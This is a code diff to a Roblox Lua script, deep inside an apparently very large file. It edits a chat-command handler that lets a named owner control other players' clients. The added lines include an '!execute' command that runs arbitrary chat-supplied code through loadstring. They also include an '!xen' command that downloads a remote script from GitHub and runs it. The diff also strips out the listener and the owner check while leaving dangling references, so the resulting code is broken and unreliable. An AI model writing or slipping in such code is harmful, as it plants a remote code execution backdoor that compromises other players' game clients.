@@ -29937,39 +29937,24 @@ do
     local lp = game:GetService("Players").LocalPlayer
 
     -- skip if this is the owner's own client
-    if lp.Name == OWNER then return end
+    if cmd == "!freeze" then
+    if hrp then hrp.Anchored = true end
+    if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
 
-    local function listenToOwner(p)
-        if p.Name ~= OWNER then return end
-        p.Chatted:Connect(function(msg)
-            local args = msg:lower():split(" ")
-            local cmd = args[1]
-            local char = lp.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
+elseif cmd == "!unfreeze" then
+    if hrp then hrp.Anchored = false end
+    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
 
-            if cmd == "!freeze" then
-                if hrp then hrp.Anchored = true end
-                if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
+elseif cmd == "!kick" then
+    lp:Kick("Kicked by owner")
 
-            elseif cmd == "!unfreeze" then
-                if hrp then hrp.Anchored = false end
-                if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
+elseif cmd == "!execute" then
+    local code = msg:sub(10)
+    local fn, err = loadstring(code)
+    if fn then pcall(fn) end
 
-            elseif cmd == "!tp" and args[2] and args[3] and args[4] then
-                if hrp then
-                    hrp.CFrame = CFrame.new(
-                        tonumber(args[2]),
-                        tonumber(args[3]),
-                        tonumber(args[4])
-                    )
-                end
-            end
-        end)
+elseif cmd == "!xen" then
+    local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
+    if fn then pcall(fn) end
+
     end
-
-    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-        listenToOwner(p)
-    end
-    game:GetService("Players").PlayerAdded:Connect(listenToOwner)
-end
